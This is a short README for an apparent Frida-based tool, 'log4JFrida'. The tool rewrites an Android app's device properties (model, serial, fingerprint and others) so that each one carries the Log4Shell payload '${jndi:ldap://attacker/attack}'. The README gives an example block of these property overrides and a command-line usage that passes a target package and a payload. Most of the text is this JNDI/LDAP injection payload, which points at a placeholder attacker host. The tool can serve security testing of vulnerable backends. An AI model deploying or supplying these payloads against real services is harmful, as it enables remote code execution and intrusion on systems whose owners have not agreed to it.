# log4JFrida

Modifies all device characteristicts in order to return a Log4j payload instead:

**Example**:

```    
    buildProperties.MODEL.value="${jndi:ldap://attacker/attack}";
​    buildProperties.DEVICE.value="${jndi:ldap://attacker/attack}";
​    buildProperties.BOARD.value="${jndi:ldap://attacker/attack}";
​    buildProperties.PRODUCT.value="${jndi:ldap://attacker/attack}";
​    buildProperties.HARDWARE.value="${jndi:ldap://attacker/attack}";
​    buildProperties.FINGERPRINT.value="${jndi:ldap://attacker/attack}"
​    buildProperties.MANUFACTURER.value="${jndi:ldap://attacker/attack}";
​    buildProperties.BOOTLOADER.value="${jndi:ldap://attacker/attack}";
​    buildProperties.BRAND.value="${jndi:ldap://attacker/attack}";
​    buildProperties.HOST.value="${jndi:ldap://attacker/attack}";
​    buildProperties.ID.value="${jndi:ldap://attacker/attack}";
​    buildProperties.DISPLAY.value="${jndi:ldap://attacker/attack}";
​    buildProperties.TAGS.value="${jndi:ldap://attacker/attack}";
​    buildProperties.SERIAL.value="${jndi:ldap://attacker/attack}";
​    buildProperties.TYPE.value="${jndi:ldap://attacker/attack}";
​    buildProperties.USER.value="${jndi:ldap://attacker/attack}";
​    buildProperties.UNKNOWN.value="${jndi:ldap://attacker/attack}";
```



**Requirements**: Frida

Usage:

```$python3 log4Frida.py com.foo.bar  '${jndi:ldap://attacker/a}' ```

